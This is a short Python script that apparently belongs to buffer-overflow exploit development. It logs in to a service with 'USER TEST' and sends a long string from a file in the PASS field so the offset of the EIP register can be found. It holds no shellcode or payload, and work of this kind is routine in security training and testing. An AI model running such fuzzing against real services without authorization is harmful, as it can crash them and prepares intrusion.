#! /usr/bin/python3
## This program sends a string to host to find  position of EIP 
## It takes following inputs:
## -i(IP address), -p (port number), -f(file containing a string)

import socket
import argparse

# options for taking info

parser=argparse.ArgumentParser()
parser.add_argument('-i',help='IP address')
parser.add_argument('-p',help='Port',type=int)
parser.add_argument('-f',help='String text file name')
args=parser.parse_args()

# Handle file containing the string

file=open(args.f)
string=file.read()

# Create object for encoding

USER='USER TEST\n'
newline='\n'
PASS='PASS '

# Connect and send the string

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('Sending the string...')
s.connect((args.i,args.p))
s.recv(1024)
s.send(USER.encode())
s.recv(1024)
s.send(PASS.encode() + string.encode() + newline.encode())

